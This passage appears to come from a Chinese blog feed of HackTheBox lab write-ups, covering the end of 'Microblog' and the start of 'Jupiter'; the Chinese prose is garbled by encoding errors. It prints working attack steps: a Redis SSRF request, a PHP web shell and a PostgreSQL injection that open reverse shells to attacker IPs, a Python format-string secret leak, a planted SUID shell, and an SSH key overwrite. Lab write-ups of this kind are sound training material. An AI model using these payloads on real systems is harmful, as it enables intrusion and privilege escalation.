<pre class="line-numbers language-none"><code class="language-none">curl -X HSET "http://microblog.htb/static/unix:%2Fvar%2Frun%2Fredis%2Fredis.sock:test%20pro%20true%20a/b"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230927152401752.png"></p>
<p>æ‰§è¡Œä¹‹åï¼Œå¯çœ‹åˆ°ç”¨æˆ·å·²å˜æˆproæƒé™</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230927152459425.png" style="zoom:50%;">

<p>ç„¶åå¦‚ä¸‹å‘½ä»¤å†™åå¼¹shell</p>
<pre class="line-numbers language-none"><code class="language-none">id=/var/www/microblog/test/uploads/rev.php&amp;header=&lt;%3fphp+echo+shell_exec("rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2&gt;%261|nc+10.10.14.9+9898+&gt;/tmp/f")%3b%3f&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230927153522937.png"></p>
<p>å¼€å¯ç›‘å¬</p>
<p>ç„¶åè®¿é—®<code>http://test.microblog.htb/uploads/rev.php</code></p>
<p>æˆåŠŸè·å–www-dataç”¨æˆ·æƒé™</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230927153458744.png"></p>
<p>ä¾æ¬¡æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼Œæ‰¾åˆ°ä¿¡æ¯æ³„éœ²</p>
<pre class="line-numbers language-none"><code class="language-none">redis-cli -s /run/redis/redis.sock
keys *
hgetall cooper.dooper<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230927153919922.png"></p>
<p>ç„¶åsshå°è¯•è¿æ¥ï¼Œå®é™…ç”¨æˆ·åå¯†ç å¦‚ä¸‹</p>
<pre class="line-numbers language-none"><code class="language-none">cooper:zooperdoopercooper<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230927154156545.png"></p>
<p>æ‰§è¡Œ<code>sudo -l</code>ï¼ŒæŸ¥çœ‹å¯ä»¥ä»¥rootèº«ä»½æ‰§è¡Œçš„å‘½ä»¤</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230927154506078.png"></p>
<p><code>/usr/bin/license</code>å†…å®¹å¦‚ä¸‹</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/python3</span>

<span class="token keyword">import</span> base64
<span class="token keyword">from</span> cryptography<span class="token punctuation">.</span>hazmat<span class="token punctuation">.</span>backends <span class="token keyword">import</span> default_backend
<span class="token keyword">from</span> cryptography<span class="token punctuation">.</span>hazmat<span class="token punctuation">.</span>primitives <span class="token keyword">import</span> hashes
<span class="token keyword">from</span> cryptography<span class="token punctuation">.</span>hazmat<span class="token punctuation">.</span>primitives<span class="token punctuation">.</span>kdf<span class="token punctuation">.</span>pbkdf2 <span class="token keyword">import</span> PBKDF2HMAC
<span class="token keyword">from</span> cryptography<span class="token punctuation">.</span>fernet <span class="token keyword">import</span> Fernet
<span class="token keyword">import</span> random
<span class="token keyword">import</span> string
<span class="token keyword">from</span> datetime <span class="token keyword">import</span> date
<span class="token keyword">import</span> redis
<span class="token keyword">import</span> argparse
<span class="token keyword">import</span> os
<span class="token keyword">import</span> sys

<span class="token keyword">class</span> <span class="token class-name">License</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        chars <span class="token operator">=</span> string<span class="token punctuation">.</span>ascii_letters <span class="token operator">+</span> string<span class="token punctuation">.</span>digits <span class="token operator">+</span> string<span class="token punctuation">.</span>punctuation
        self<span class="token punctuation">.</span>license <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span>chars<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">40</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>created <span class="token operator">=</span> date<span class="token punctuation">.</span>today<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> os<span class="token punctuation">.</span>geteuid<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Microblog license key manager can only be run as root"</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span>
    sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span>

parser <span class="token operator">=</span> argparse<span class="token punctuation">.</span>ArgumentParser<span class="token punctuation">(</span>description<span class="token operator">=</span><span class="token string">'Microblog license key manager'</span><span class="token punctuation">)</span>
group <span class="token operator">=</span> parser<span class="token punctuation">.</span>add_mutually_exclusive_group<span class="token punctuation">(</span>required<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
group<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'-p'</span><span class="token punctuation">,</span> <span class="token string">'--provision'</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">'Provision license key for specified user'</span><span class="token punctuation">,</span> metavar<span class="token operator">=</span><span class="token string">'username'</span><span class="token punctuation">)</span>
group<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'-d'</span><span class="token punctuation">,</span> <span class="token string">'--deprovision'</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">'Deprovision license key for specified user'</span><span class="token punctuation">,</span> metavar<span class="token operator">=</span><span class="token string">'username'</span><span class="token punctuation">)</span>
group<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'-c'</span><span class="token punctuation">,</span> <span class="token string">'--check'</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">'Check if specified license key is valid'</span><span class="token punctuation">,</span> metavar<span class="token operator">=</span><span class="token string">'license_key'</span><span class="token punctuation">)</span>
args <span class="token operator">=</span> parser<span class="token punctuation">.</span>parse_args<span class="token punctuation">(</span><span class="token punctuation">)</span>

r <span class="token operator">=</span> redis<span class="token punctuation">.</span>Redis<span class="token punctuation">(</span>unix_socket_path<span class="token operator">=</span><span class="token string">'/var/run/redis/redis.sock'</span><span class="token punctuation">)</span>

secret <span class="token operator">=</span> <span class="token punctuation">[</span>line<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">for</span> line <span class="token keyword">in</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/root/license/secret"</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
secret_encoded <span class="token operator">=</span> secret<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>
salt <span class="token operator">=</span> <span class="token string">b'microblogsalt123'</span>
kdf <span class="token operator">=</span> PBKDF2HMAC<span class="token punctuation">(</span>algorithm<span class="token operator">=</span>hashes<span class="token punctuation">.</span>SHA256<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>length<span class="token operator">=</span><span class="token number">32</span><span class="token punctuation">,</span>salt<span class="token operator">=</span>salt<span class="token punctuation">,</span>iterations<span class="token operator">=</span><span class="token number">100000</span><span class="token punctuation">,</span>backend<span class="token operator">=</span>default_backend<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
encryption_key <span class="token operator">=</span> base64<span class="token punctuation">.</span>urlsafe_b64encode<span class="token punctuation">(</span>kdf<span class="token punctuation">.</span>derive<span class="token punctuation">(</span>secret_encoded<span class="token punctuation">)</span><span class="token punctuation">)</span>

f <span class="token operator">=</span> Fernet<span class="token punctuation">(</span>encryption_key<span class="token punctuation">)</span>
l <span class="token operator">=</span> License<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token comment">#provision</span>
<span class="token keyword">if</span><span class="token punctuation">(</span>args<span class="token punctuation">.</span>provision<span class="token punctuation">)</span><span class="token punctuation">:</span>
    user_profile <span class="token operator">=</span> r<span class="token punctuation">.</span>hgetall<span class="token punctuation">(</span>args<span class="token punctuation">.</span>provision<span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token keyword">not</span> user_profile<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"User does not exist. Please provide valid username."</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span>
        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span>
    existing_keys <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/root/license/keys"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span>
    all_keys <span class="token operator">=</span> existing_keys<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> user_key <span class="token keyword">in</span> all_keys<span class="token punctuation">:</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span>user_key<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> args<span class="token punctuation">.</span>provision<span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"License key has already been provisioned for this user"</span><span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span>
            sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span>
    prefix <span class="token operator">=</span> <span class="token string">"microblog"</span>
    username <span class="token operator">=</span> r<span class="token punctuation">.</span>hget<span class="token punctuation">(</span>args<span class="token punctuation">.</span>provision<span class="token punctuation">,</span> <span class="token string">"username"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
    firstlast <span class="token operator">=</span> r<span class="token punctuation">.</span>hget<span class="token punctuation">(</span>args<span class="token punctuation">.</span>provision<span class="token punctuation">,</span> <span class="token string">"first-name"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> r<span class="token punctuation">.</span>hget<span class="token punctuation">(</span>args<span class="token punctuation">.</span>provision<span class="token punctuation">,</span> <span class="token string">"last-name"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
    license_key <span class="token operator">=</span> <span class="token punctuation">(</span>prefix <span class="token operator">+</span> username <span class="token operator">+</span> <span class="token string">"{license.license}"</span> <span class="token operator">+</span> firstlast<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>license<span class="token operator">=</span>l<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Plaintext license key:"</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"------------------------------------------------------"</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>license_key<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span>
    license_key_encoded <span class="token operator">=</span> license_key<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>
    license_key_encrypted <span class="token operator">=</span> f<span class="token punctuation">.</span>encrypt<span class="token punctuation">(</span>license_key_encoded<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Encrypted license key (distribute to customer):"</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"------------------------------------------------------"</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>license_key_encrypted<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span>
    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/root/license/keys"</span><span class="token punctuation">,</span> <span class="token string">"a"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> license_keys_file<span class="token punctuation">:</span>
        license_keys_file<span class="token punctuation">.</span>write<span class="token punctuation">(</span>args<span class="token punctuation">.</span>provision <span class="token operator">+</span> <span class="token string">":"</span> <span class="token operator">+</span> license_key_encrypted<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"\n"</span><span class="token punctuation">)</span>

<span class="token comment">#deprovision</span>
<span class="token keyword">if</span><span class="token punctuation">(</span>args<span class="token punctuation">.</span>deprovision<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"License key deprovisioning coming soon"</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span>
    sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token comment">#check</span>
<span class="token keyword">if</span><span class="token punctuation">(</span>args<span class="token punctuation">.</span>check<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        license_key_decrypted <span class="token operator">=</span> f<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>args<span class="token punctuation">.</span>check<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"License key valid! Decrypted value:"</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"------------------------------------------------------"</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>license_key_decrypted<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"License key invalid"</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="äº”ã€pythonæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´"><a href="#äº”ã€pythonæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´" class="headerlink" title="äº”ã€pythonæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´"></a>äº”ã€pythonæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</h2><p>pythonæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</p>
<p><a href="https://podalirius.net/en/articles/python-format-string-vulnerabilities/">https://podalirius.net/en/articles/python-format-string-vulnerabilities/</a></p>
<p>è¿æ¥redis</p>
<pre class="line-numbers language-none"><code class="language-none">redis-cli -s /run/redis/redis.sock<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>ç„¶åæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼Œä»¥æ˜æ–‡å½¢å¼è·å–å£ä»¤</p>
<pre class="line-numbers language-none"><code class="language-none">HMSET test first-name "{license.__init__.__globals__[secret_encoded]}" last-name test username test<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤</p>
<pre class="line-numbers language-none"><code class="language-none">sudo /usr/bin/license -p test<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230927161244025.png"></p>
<p>å£ä»¤å¦‚ä¸‹</p>
<pre class="line-numbers language-none"><code class="language-none">unCR4ckaBL3Pa$$w0rd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>æˆåŠŸè·å–rootæƒé™</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230927161336159.png"></p>
<p>Overï¼</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230927161500540.png" style="zoom: 67%;">]]></content>
      <categories>
        <category>é¶æœº</category>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>LFI</tag>
        <tag>redisæœªæˆæƒ</tag>
        <tag>pythonæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-Jupiter</title>
    <url>/posts/d4f5920f.html</url>
    <content><![CDATA[<h1 id="HTB-Jupiter"><a href="#HTB-Jupiter" class="headerlink" title="HTB-Jupiter"></a>HTB-Jupiter</h1><h2 id="ä¸€ã€æ€è·¯æ¦‚è¦"><a href="#ä¸€ã€æ€è·¯æ¦‚è¦" class="headerlink" title="ä¸€ã€æ€è·¯æ¦‚è¦"></a>ä¸€ã€æ€è·¯æ¦‚è¦</h2><p>1.ä¿¡æ¯æ”¶é›†å‘ç°å­åŸŸï¼Œå­åŸŸapiå­˜åœ¨PostgreSQLæ³¨å…¥ï¼›</p>
<p>2.PostgreSQLæ³¨å…¥åå¼¹shellè·å–<code>postgres</code>ç”¨æˆ·æƒé™ï¼›</p>
<p>3.æŸ¥çœ‹<code>/etc/passwd</code>å‘ç°<code>juno</code>å’Œ<code>jovian</code>ç”¨æˆ·ï¼›</p>
<p>4.<code>juno</code>ç”¨æˆ·æœ‰å®šæ—¶ä»»åŠ¡æ–‡ä»¶å¹¶å­˜åœ¨å‘½ä»¤æ‰§è¡Œï¼›</p>
<p>5.å‘½ä»¤æ‰§è¡Œsuidææƒè·å–<code>juno</code>ç”¨æˆ·æƒé™ï¼›</p>
<p>6.æŸ¥çœ‹ç«¯å£å¼€æ”¾çŠ¶æ€å‘ç°<code>Jupyter</code>æœåŠ¡ï¼›</p>
<p>7.sshå…¬é’¥ä¼ªé€ å®ç°ç«¯å£è½¬å‘ï¼›</p>
<p>8.tokenæ³„éœ²æˆåŠŸç™»å½•å¹¶é€šè¿‡<code>Jupyter</code>åå¼¹shellè·å–<code>jovian</code>ç”¨æˆ·æƒé™ï¼›</p>
<p>9.sudo -lå‘ç°ä»»æ„æ–‡ä»¶è¯»å–è·å–rootæ–‡ä»¶ã€‚</p>
<h2 id="äºŒã€ä¿¡æ¯æ”¶é›†"><a href="#äºŒã€ä¿¡æ¯æ”¶é›†" class="headerlink" title="äºŒã€ä¿¡æ¯æ”¶é›†"></a>äºŒã€ä¿¡æ¯æ”¶é›†</h2><p>nmapæ‰«æç«¯å£æœåŠ¡</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231010100228960.png"></p>
<p>80ç«¯å£å¼€æ”¾ï¼Œæœ‰åŸŸåï¼Œå†™å…¥æœ¬åœ°hostsæ–‡ä»¶</p>
<pre class="line-numbers language-none"><code class="language-none">echo "10.10.11.216 jupiter.htb" &gt;&gt; /etc/hosts<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>æµè§ˆå™¨è®¿é—®ï¼Œé¦–é¡µå¦‚ä¸‹å›¾</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231010101337440.png" style="zoom: 67%;">

<p>æ‰«æå­åŸŸ</p>
<pre class="line-numbers language-none"><code class="language-none">gobuster vhost -u http://jupiter.htb --append-domain -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 50<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231010103659223.png"></p>
<p>å‘ç°å­åŸŸ<code>kiosk.jupiter.htb</code>ï¼Œå†™å…¥æœ¬åœ°hostsæ–‡ä»¶</p>
<pre class="line-numbers language-none"><code class="language-none">echo "10.10.11.216 kiosk.jupiter.htb" &gt;&gt; /etc/hosts<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>è®¿é—®å­åŸŸ</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231010103833540.png"></p>
<p>ç”±æ ‡ç­¾é¡µæ ‡é¢˜åˆ¤æ–­å‡ºæ˜¯Grafanaæ¡†æ¶ï¼Œè®¿é—®çš„åŒæ—¶BurpæŠ“åŒ…çœ‹åˆ°å¦‚ä¸‹apiï¼Œå…¶ä¸­æœ‰PostgresSQLè¯­å¥æ‰§è¡Œ</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231010105548771.png"></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231010105518818.png"></p>
<h2 id="ä¸‰ã€PostgreSQLæ³¨å…¥åå¼¹shell"><a href="#ä¸‰ã€PostgreSQLæ³¨å…¥åå¼¹shell" class="headerlink" title="ä¸‰ã€PostgreSQLæ³¨å…¥åå¼¹shell"></a>ä¸‰ã€PostgreSQLæ³¨å…¥åå¼¹shell</h2><p>å‚è€ƒï¼š<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#cve-20199193">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#cve-20199193</a></p>
<p>å­˜åœ¨æ³¨å…¥ï¼ˆå¯ç”¨<code>SELECT version()</code>æµ‹è¯•æ˜¯å¦å­˜åœ¨sqlæ³¨å…¥ï¼‰</p>
<p>æå‰åœ¨æœ¬åœ°kaliå¼€å¯ç›‘å¬ï¼Œä¾æ¬¡æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤åå¼¹shell</p>
<pre class="line-numbers language-none"><code class="language-none">DROP TABLE IF EXISTS cmd_exec;

CREATE TABLE cmd_exec(cmd_output text);

COPY cmd_exec FROM PROGRAM 'bash -c \"bash -i &gt;&amp; /dev/tcp/10.10.14.5/9898 0&gt;&amp;1\"';<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231010110050116.png" style="zoom: 80%;">

<p>æˆåŠŸè·å–<code>postgres</code>ç”¨æˆ·æƒé™</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231010110117546.png"></p>
<p>æŸ¥çœ‹<code>/etc/passwd</code>ï¼Œé™¤rootå¤–è¿˜æœ‰ä¸¤ä¸ªç”¨æˆ·ï¼š<code>juno</code>å’Œ<code>jovian</code></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231010111138516.png"></p>
<h2 id="å››ã€å®šæ—¶ä»»åŠ¡å‘½ä»¤æ‰§è¡Œsuidææƒ"><a href="#å››ã€å®šæ—¶ä»»åŠ¡å‘½ä»¤æ‰§è¡Œsuidææƒ" class="headerlink" title="å››ã€å®šæ—¶ä»»åŠ¡å‘½ä»¤æ‰§è¡Œsuidææƒ"></a>å››ã€å®šæ—¶ä»»åŠ¡å‘½ä»¤æ‰§è¡Œsuidææƒ</h2><p>æŸ¥æ‰¾å±äºç”¨æˆ· <code>juno</code> çš„æ–‡ä»¶å’Œç›®å½•ï¼ˆç»å°è¯•ï¼Œ<code>jovian</code>ç”¨æˆ·çš„æ–‡ä»¶<code>postgres</code>ç”¨æˆ·æ— å¯è¯»æƒé™ï¼‰</p>
<pre class="line-numbers language-none"><code class="language-none">find / -user juno 2&gt;/dev/null<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231010134124990.png"></p>
<p>æŸ¥çœ‹ä¸ä¼—ä¸åŒçš„æ–‡ä»¶</p>
<pre class="line-numbers language-none"><code class="language-none">cat /dev/shm/network-simulation.yml<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231010134545805.png"></p>
<p>æ­¤å¤„æ‰§è¡Œpspy64ï¼Œå¯¹æ¯”æ‰§è¡Œç»“æœï¼Œå¯çœ‹åˆ°ä¸‹ä¾§serverå’Œclientçš„pathå’Œargsä¼šè¢«å½“ä½œå‘½ä»¤æ‰§è¡Œ</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231010164458642.png"></p>
<p>åˆ‡æ¢æˆäº¤äº’å¼shellï¼ˆæ–¹ä¾¿ç¼–è¾‘æ–‡ä»¶ï¼‰</p>
<pre class="line-numbers language-none"><code class="language-none">python3 -c 'import pty;pty.spawn("/bin/bash")'
Ctrl+Z
stty raw -echo; fg
export TERM=xterm<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>ä¿®æ”¹<code>vim /dev/shm/network-simulation.yml</code></p>
<pre class="line-numbers language-none"><code class="language-none">- path: /usr/bin/cp
  args: /bin/bash /tmp/bash

- path: /usr/bin/chmod
  args: u+s /tmp/bash<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ç¨ç­‰ç‰‡åˆ»ï¼Œå¯çœ‹åˆ°<code>/tmp/bash</code>æ–‡ä»¶æœ‰äº†suid</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231010140724460.png"></p>
<p>æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ææƒï¼ŒæˆåŠŸè·å–<code>juno</code>ç”¨æˆ·æƒé™</p>
<pre class="line-numbers language-none"><code class="language-none">/tmp/bash -p<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231010141036273.png"></p>
<p>è¿›å…¥<code>juno</code>ç”¨æˆ·homeç›®å½•ä¸‹æŸ¥çœ‹</p>
<pre class="line-numbers language-none"><code class="language-none">cd /home/juno
ls la<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p> <code>juno</code> ç”¨æˆ·æ²¡æœ‰<code>user.txt</code>è¯»æƒé™ï¼Œä½†å¯çœ‹åˆ°æœ‰<code>.ssh</code>ç›®å½•</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231010141231076.png"></p>
<h2 id="äº”ã€sshå…¬é’¥ä¼ªé€ "><a href="#äº”ã€sshå…¬é’¥ä¼ªé€ " class="headerlink" title="äº”ã€sshå…¬é’¥ä¼ªé€ "></a>äº”ã€sshå…¬é’¥ä¼ªé€ </h2><p>çœ‹åˆ°æœ‰è®¤è¯å¯†é’¥ï¼Œå¯ä»¥ä¼ªé€ sshå¯†é’¥è¿æ¥</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231010142509889.png"></p>
<p>æœ¬åœ°ç”¨<code>ssh-keygen</code>ç”Ÿæˆsshå…¬ç§é’¥</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231010142255050.png"></p>
<p>ä¼ åˆ°é¶æœºï¼Œå¹¶è¦†ç›–æ‰åŸæ¥çš„å¯†é’¥æ–‡ä»¶<code>authorized_keys</code></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231010142554012.png"></p>
